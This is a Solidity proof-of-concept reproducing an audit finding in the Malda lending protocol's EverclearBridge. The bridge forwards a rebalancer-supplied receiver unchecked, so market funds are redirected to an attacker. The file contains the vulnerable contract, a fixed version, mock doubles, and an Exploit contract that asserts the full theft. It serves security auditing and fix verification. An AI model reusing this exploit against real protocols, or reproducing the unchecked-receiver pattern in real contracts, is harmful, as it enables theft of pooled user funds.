// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Malda finding 62723 (Sherlock H-1):
// "Rebalancer can steal funds from markets by sending to custom receiver
//  through Everclear Bridge".
//
// The rebalancer calls EverclearBridge.sendMsg with an operator-supplied bytes
// message. sendMsg decodes it into IntentParams and forwards params.receiver
// verbatim to everclearFeeAdapter.newIntent WITHOUT validating that receiver is
// a legitimate destination market. A semi-trusted rebalancer EOA sets
// receiver = an address it controls, so the market funds extracted for
// cross-chain rebalancing are routed to the attacker instead of the market.
//
// The verbatim vulnerable EverclearBridge contract (sendMsg + _decodeIntent +
// IntentParams) is inlined below unchanged from the audited source
// (github.com/sherlock-audit/2025-07-malda ::
//  malda-lending/src/rebalancer/bridges/EverclearBridge.sol). Only the opaque
// external boundary — the Everclear FeeAdapter's cross-chain settlement — is
// modelled by a minimal faithful double whose newIntent pulls `amount` of the
// input asset from the bridge and delivers it to `receiver` (intent
// settlement). The token is a minimal ERC20 double. Nothing on the vulnerable
// path (the unchecked receiver) is mocked.
// ─────────────────────────────────────────────────────────────────────────────

// ── Minimal faithful ERC20 double (the opaque bridged/input asset) ───────────
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MiniToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Minimal faithful SafeERC20 (only safeTransfer is on the vulnerable path,
///      in the excess-return branch). Matches OZ semantics for a bool-returning token.
library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        require(token.transfer(to, value), "safeTransfer failed");
    }
}

// ── Verbatim SafeApprove library (malda-lending/src/libraries/SafeApprove.sol) ─
interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);
}

library SafeApprove {
    error SafeApprove_NoContract();
    error SafeApprove_Failed();

    function safeApprove(address token, address to, uint256 value) internal {
        require(token.code.length > 0, SafeApprove_NoContract());

        bool success;
        bytes memory data;
        (success, data) = token.call(abi.encodeCall(IToken.approve, (to, 0)));
        require(success && (data.length == 0 || abi.decode(data, (bool))), SafeApprove_Failed());

        if (value > 0) {
            (success, data) = token.call(abi.encodeCall(IToken.approve, (to, value)));
            require(success && (data.length == 0 || abi.decode(data, (bool))), SafeApprove_Failed());
        }
    }
}

// ── Verbatim BytesLib.slice (malda-lending/src/libraries/BytesLib.sol) ────────
library BytesLib {
    function slice(bytes memory _bytes, uint256 _start, uint256 _length) internal pure returns (bytes memory) {
        require(_length + 31 >= _length, "slice_overflow");
        require(_bytes.length >= _start + _length, "slice_outOfBounds");

        bytes memory tempBytes;

        assembly {
            switch iszero(_length)
            case 0 {
                tempBytes := mload(0x40)

                let lengthmod := and(_length, 31)

                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))
                let end := add(mc, _length)

                for {
                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)
                } lt(mc, end) {
                    mc := add(mc, 0x20)
                    cc := add(cc, 0x20)
                } { mstore(mc, mload(cc)) }

                mstore(tempBytes, _length)

                mstore(0x40, and(add(mc, 31), not(31)))
            }
            default {
                tempBytes := mload(0x40)
                mstore(tempBytes, 0)

                mstore(0x40, add(tempBytes, 0x20))
            }
        }

        return tempBytes;
    }
}

// ── Verbatim IFeeAdapter interface (src/interfaces/external/everclear/IFeeAdapter.sol) ─
interface IFeeAdapter {
    struct Intent {
        bytes32 initiator;
        bytes32 receiver;
        bytes32 inputAsset;
        bytes32 outputAsset;
        uint24 maxFee;
        uint32 origin;
        uint64 nonce;
        uint48 timestamp;
        uint48 ttl;
        uint256 amount;
        uint32[] destinations;
        bytes data;
    }

    struct FeeParams {
        uint256 fee;
        uint256 deadline;
        bytes sig;
    }

    function newIntent(
        uint32[] memory _destinations,
        bytes32 _receiver,
        address _inputAsset,
        bytes32 _outputAsset,
        uint256 _amount,
        uint24 _maxFee,
        uint48 _ttl,
        bytes calldata _data,
        FeeParams calldata _feeParams
    ) external payable returns (bytes32 _intentId, Intent memory _intent);
}

// ── Minimal faithful IRoles + roles double (the rebalancer legitimately holds
//    the REBALANCER role — semi-trusted actor abusing an unchecked parameter). ─
interface IRoles {
    function REBALANCER() external view returns (bytes32);
    function GUARDIAN_BRIDGE() external view returns (bytes32);
    function isAllowedFor(address _contract, bytes32 _role) external view returns (bool);
}

contract MockRoles is IRoles {
    bytes32 public constant REBALANCER = keccak256("REBALANCER");
    bytes32 public constant GUARDIAN_BRIDGE = keccak256("GUARDIAN_BRIDGE");

    address public rebalancer;

    constructor(address _rebalancer) {
        rebalancer = _rebalancer;
    }

    function isAllowedFor(address _contract, bytes32 _role) external view returns (bool) {
        if (_role == REBALANCER) return _contract == rebalancer;
        return false;
    }
}

// ── Verbatim BaseBridge (malda-lending/src/rebalancer/bridges/BaseBridge.sol) ──
abstract contract BaseBridge {
    // ----------- STORAGE ------------
    IRoles public roles;

    error BaseBridge_NotAuthorized();
    error BaseBridge_AmountMismatch();
    error BaseBridge_AmountNotValid();
    error BaseBridge_AddressNotValid();

    constructor(address _roles) {
        require(_roles != address(0), BaseBridge_AddressNotValid());

        roles = IRoles(_roles);
    }

    modifier onlyBridgeConfigurator() {
        if (!roles.isAllowedFor(msg.sender, roles.GUARDIAN_BRIDGE())) revert BaseBridge_NotAuthorized();
        _;
    }

    modifier onlyRebalancer() {
        if (!roles.isAllowedFor(msg.sender, roles.REBALANCER())) revert BaseBridge_NotAuthorized();
        _;
    }
}

interface IBridge {
    function getFee(uint32 _dstChainId, bytes memory _message, bytes memory _bridgeData)
        external
        view
        returns (uint256);
    function sendMsg(
        uint256 _extractedAmount,
        address _market,
        uint32 _dstChainId,
        address _token,
        bytes memory _message,
        bytes memory _bridgeData
    ) external payable;
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — verbatim from the audited source. sendMsg and
// _decodeIntent are byte-identical to
// malda-lending/src/rebalancer/bridges/EverclearBridge.sol at the audited commit.
// ─────────────────────────────────────────────────────────────────────────────
contract EverclearBridge is BaseBridge, IBridge {
    using SafeERC20 for IERC20;
    using BytesLib for bytes;

    // ----------- STORAGE ------------
    IFeeAdapter public everclearFeeAdapter;

    struct IntentParams {
        uint32[] destinations;
        bytes32 receiver;
        address inputAsset;
        bytes32 outputAsset;
        uint256 amount;
        uint24 maxFee;
        uint48 ttl;
        bytes data;
        IFeeAdapter.FeeParams feeParams;
    }

    // ----------- EVENTS ------------
    event MsgSent(uint256 indexed dstChainId, address indexed market, uint256 amountLD, bytes32 id);
    event RebalancingReturnedToMarket(address indexed market, uint256 toReturn, uint256 extracted);

    // ----------- ERRORS ------------
    error Everclear_TokenMismatch();
    error Everclear_NotImplemented();
    error Everclear_AddressNotValid();
    error Everclear_DestinationNotValid();
    error Everclear_DestinationsLengthMismatch();

    constructor(address _roles, address _feeAdapter) BaseBridge(_roles) {
        require(_feeAdapter != address(0), Everclear_AddressNotValid());

        everclearFeeAdapter = IFeeAdapter(_feeAdapter);
    }

    // ----------- VIEW ------------
    function getFee(uint32, bytes memory, bytes memory) external pure returns (uint256) {
        // need to use Everclear API
        revert Everclear_NotImplemented();
    }

    // ----------- EXTERNAL ------------
    function sendMsg(
        uint256 _extractedAmount,
        address _market,
        uint32 _dstChainId,
        address _token,
        bytes memory _message,
        bytes memory // unused
    ) external payable onlyRebalancer {
        IntentParams memory params = _decodeIntent(_message);

        require(params.inputAsset == _token, Everclear_TokenMismatch());
        require(_extractedAmount >= params.amount, BaseBridge_AmountMismatch());

        uint256 destinationsLength = params.destinations.length;
        require(destinationsLength > 0, Everclear_DestinationsLengthMismatch());

        bool found;
        for (uint256 i; i < destinationsLength; ++i) {
            if (params.destinations[i] == _dstChainId) {
                found = true;
                break;
            }
        }
        require(found, Everclear_DestinationNotValid());

        if (_extractedAmount > params.amount) {
            uint256 toReturn = _extractedAmount - params.amount;
            IERC20(_token).safeTransfer(_market, toReturn);
            emit RebalancingReturnedToMarket(_market, toReturn, _extractedAmount);
        }

        SafeApprove.safeApprove(params.inputAsset, address(everclearFeeAdapter), params.amount);
        (bytes32 id,) = everclearFeeAdapter.newIntent(
            params.destinations,
            params.receiver, // @> attacker-controlled receiver forwarded UNCHECKED — market funds routed to the rebalancer's own address
            params.inputAsset,
            params.outputAsset,
            params.amount,
            params.maxFee,
            params.ttl,
            params.data,
            params.feeParams
        );
        emit MsgSent(_dstChainId, _market, params.amount, id);
    }

    // ----------- INTERNAL ------------
    function _decodeIntent(bytes memory message) internal pure returns (IntentParams memory) {
        // message contains data obtained from `https://api.everclear.org/intents` call
        // data can be decoded into `FeeAdapter.newIntent` call params

        // skip selector
        bytes memory intentData = BytesLib.slice(message, 4, message.length - 4);
        (
            uint32[] memory destinations,
            bytes32 receiver,
            address inputAsset,
            bytes32 outputAsset,
            uint256 amount,
            uint24 maxFee,
            uint48 ttl,
            bytes memory data,
            IFeeAdapter.FeeParams memory feeParams
        ) = abi.decode(
            intentData, (uint32[], bytes32, address, bytes32, uint256, uint24, uint48, bytes, IFeeAdapter.FeeParams)
        );

        return IntentParams(destinations, receiver, inputAsset, outputAsset, amount, maxFee, ttl, data, feeParams);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (team fix, PR #103): params.receiver is forced to equal the
// destination _market before it is forwarded. Funds can only ever reach the
// legitimate market — the attacker-controlled receiver is ignored.
// ─────────────────────────────────────────────────────────────────────────────
contract EverclearBridgeFixed is BaseBridge, IBridge {
    using SafeERC20 for IERC20;
    using BytesLib for bytes;

    IFeeAdapter public everclearFeeAdapter;

    struct IntentParams {
        uint32[] destinations;
        bytes32 receiver;
        address inputAsset;
        bytes32 outputAsset;
        uint256 amount;
        uint24 maxFee;
        uint48 ttl;
        bytes data;
        IFeeAdapter.FeeParams feeParams;
    }

    event MsgSent(uint256 indexed dstChainId, address indexed market, uint256 amountLD, bytes32 id);
    event RebalancingReturnedToMarket(address indexed market, uint256 toReturn, uint256 extracted);

    error Everclear_TokenMismatch();
    error Everclear_NotImplemented();
    error Everclear_AddressNotValid();
    error Everclear_DestinationNotValid();
    error Everclear_DestinationsLengthMismatch();

    constructor(address _roles, address _feeAdapter) BaseBridge(_roles) {
        require(_feeAdapter != address(0), Everclear_AddressNotValid());
        everclearFeeAdapter = IFeeAdapter(_feeAdapter);
    }

    function getFee(uint32, bytes memory, bytes memory) external pure returns (uint256) {
        revert Everclear_NotImplemented();
    }

    function sendMsg(
        uint256 _extractedAmount,
        address _market,
        uint32 _dstChainId,
        address _token,
        bytes memory _message,
        bytes memory // unused
    ) external payable onlyRebalancer {
        IntentParams memory params = _decodeIntent(_message);

        require(params.inputAsset == _token, Everclear_TokenMismatch());
        require(_extractedAmount >= params.amount, BaseBridge_AmountMismatch());

        uint256 destinationsLength = params.destinations.length;
        require(destinationsLength > 0, Everclear_DestinationsLengthMismatch());

        bool found;
        for (uint256 i; i < destinationsLength; ++i) {
            if (params.destinations[i] == _dstChainId) {
                found = true;
                break;
            }
        }
        require(found, Everclear_DestinationNotValid());

        // FIX: receiver is pinned to the legitimate market; the operator-supplied
        // receiver can no longer redirect the funds.
        params.receiver = bytes32(uint256(uint160(_market)));

        if (_extractedAmount > params.amount) {
            uint256 toReturn = _extractedAmount - params.amount;
            IERC20(_token).safeTransfer(_market, toReturn);
            emit RebalancingReturnedToMarket(_market, toReturn, _extractedAmount);
        }

        SafeApprove.safeApprove(params.inputAsset, address(everclearFeeAdapter), params.amount);
        (bytes32 id,) = everclearFeeAdapter.newIntent(
            params.destinations,
            params.receiver,
            params.inputAsset,
            params.outputAsset,
            params.amount,
            params.maxFee,
            params.ttl,
            params.data,
            params.feeParams
        );
        emit MsgSent(_dstChainId, _market, params.amount, id);
    }

    function _decodeIntent(bytes memory message) internal pure returns (IntentParams memory) {
        bytes memory intentData = BytesLib.slice(message, 4, message.length - 4);
        (
            uint32[] memory destinations,
            bytes32 receiver,
            address inputAsset,
            bytes32 outputAsset,
            uint256 amount,
            uint24 maxFee,
            uint48 ttl,
            bytes memory data,
            IFeeAdapter.FeeParams memory feeParams
        ) = abi.decode(
            intentData, (uint32[], bytes32, address, bytes32, uint256, uint24, uint48, bytes, IFeeAdapter.FeeParams)
        );

        return IntentParams(destinations, receiver, inputAsset, outputAsset, amount, maxFee, ttl, data, feeParams);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Everclear FeeAdapter double — the OPAQUE external cross-chain boundary.
// newIntent pulls `_amount` of the input asset from the calling bridge (which
// approved it) and delivers it to the intent's `receiver`. This faithfully
// models intent settlement/delivery: whatever address the bridge put in
// `receiver` is where the extracted market funds end up.
// ─────────────────────────────────────────────────────────────────────────────
contract MockFeeAdapter is IFeeAdapter {
    uint256 public nonce;

    function newIntent(
        uint32[] memory,
        bytes32 _receiver,
        address _inputAsset,
        bytes32,
        uint256 _amount,
        uint24,
        uint48,
        bytes calldata,
        FeeParams calldata
    ) external payable returns (bytes32 _intentId, Intent memory _intent) {
        // Everclear encodes destination addresses as left-padded bytes32.
        address receiverAddr = address(uint160(uint256(_receiver)));
        // Pull the extracted funds from the bridge and settle them to receiver.
        IERC20(_inputAsset).transferFrom(msg.sender, receiverAddr, _amount);
        _intentId = bytes32(++nonce);
        return (_intentId, _intent);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a semi-trusted rebalancer crafts a bridge message whose
// receiver is an attacker-controlled address. The market funds extracted for
// rebalancing are routed to the attacker instead of the destination market.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    // The legitimate destination market that SHOULD have received the funds.
    address internal constant MARKET = 0x00000000000000000000000000000000000A4e70;

    uint32 internal constant DST_CHAIN_ID = 8453; // Base
    uint256 internal constant AMOUNT = 1000 ether; // market funds extracted for rebalancing

    // Deployed pieces / results (getters the driver asserts on).
    MiniToken public inputAsset;
    MockRoles public roles;
    MockFeeAdapter public feeAdapter;
    EverclearBridge public bridge;

    address public inputAssetAddr;
    address public bridgeAddr;

    uint256 public attackerStolen;
    uint256 public marketReceived;
    uint256 public bridgeRemaining;

    constructor() {
        // Deterministic deploy order (index 0 first).
        inputAsset = new MiniToken("Stolen Input Asset", "STOLEN-inputAsset"); // 0
        roles = new MockRoles(address(this)); // 1 — this Exploit acts as the rebalancer EOA
        feeAdapter = new MockFeeAdapter(); // 2
        bridge = new EverclearBridge(address(roles), address(feeAdapter)); // 3

        inputAssetAddr = address(inputAsset);
        bridgeAddr = address(bridge);

        // Market funds are extracted to the bridge for cross-chain rebalancing.
        inputAsset.mint(address(bridge), AMOUNT);
    }

    function run() external payable {
        // Rebalancer crafts the intent message with receiver = attacker.
        bytes memory message = _buildMessage(bytes32(uint256(uint160(ATTACKER))));

        // sendMsg is onlyRebalancer; this Exploit holds the REBALANCER role.
        bridge.sendMsg(AMOUNT, MARKET, DST_CHAIN_ID, address(inputAsset), message, "");

        attackerStolen = inputAsset.balanceOf(ATTACKER);
        marketReceived = inputAsset.balanceOf(MARKET);
        bridgeRemaining = inputAsset.balanceOf(address(bridge));

        // HARM: the full 1000e18 of market funds is delivered to the attacker;
        // the market received nothing; the bridge no longer holds them.
        require(attackerStolen == AMOUNT, "attacker did not receive stolen funds");
        require(marketReceived == 0, "market unexpectedly received funds");
        require(bridgeRemaining == 0, "bridge unexpectedly retained funds");
    }

    /// @dev ABI-encode the IntentParams tuple, prefixed with a 4-byte selector
    ///      exactly as the real rebalancer message is shaped (selector is skipped
    ///      by _decodeIntent's BytesLib.slice(message, 4, ...)).
    function _buildMessage(bytes32 receiver) internal view returns (bytes memory) {
        uint32[] memory destinations = new uint32[](1);
        destinations[0] = DST_CHAIN_ID;

        IFeeAdapter.FeeParams memory feeParams =
            IFeeAdapter.FeeParams({fee: 0, deadline: 0, sig: ""});

        bytes memory body = abi.encode(
            destinations,
            receiver,
            address(inputAsset), // inputAsset
            bytes32(0), // outputAsset
            AMOUNT, // amount
            uint24(0), // maxFee
            uint48(0), // ttl
            bytes(""), // data
            feeParams
        );
        return abi.encodePacked(bytes4(0xdeadbeef), body);
    }
}
